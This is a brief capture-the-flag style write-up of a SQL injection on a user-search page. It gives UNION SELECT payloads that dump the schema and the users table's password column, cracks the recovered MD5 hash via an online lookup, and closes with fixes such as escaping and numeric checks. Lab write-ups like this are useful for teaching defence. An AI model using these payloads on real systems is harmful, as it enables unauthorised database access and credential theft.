Preview :
This page ask the user to use an id to search a user on the database. We can see an sql injection attack if we try to fill something like "\`" because the server pop an sql error: `Unknown column '' in 'where clause'`

Steps :
Firstly, we need to dump all the columns and the tables name to see what we can do to find the flag.

--> 1 UNION SELECT column_name, table_name from information_schema.columns#

We obtain all the tables and all the columns of each tables.

The users table have some interesting columns:
- user_id
- first_name
- last_name
- town
- country
- planet
- Commentaire
- countersign

Dump the columns *Commentaire* and *countersign* :

--> 1 UNION SELECT commentaire, countersign from users#

Result:

ID: 1 UNION SELECT commentaire, countersign from users# 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

- step 1 -> go to http://md5decrypt.net/#answer and decrypt `5ff9d0165b4f92b14994e5c685cdce28`
- step 2 -> lower the upper case of our decrypt mdp: FortyTwo
- step 3 -> sha256 him with http://md5decrypt.net/Sha256/

Fix :
- locked the variable recovered with the \_GET method betwen 2 quote.
- use a function to escape special character like quote, NULL, \\n, \\r etc...
- use the functions like `isnumeric()` to be sure we have recovered a numerical value.
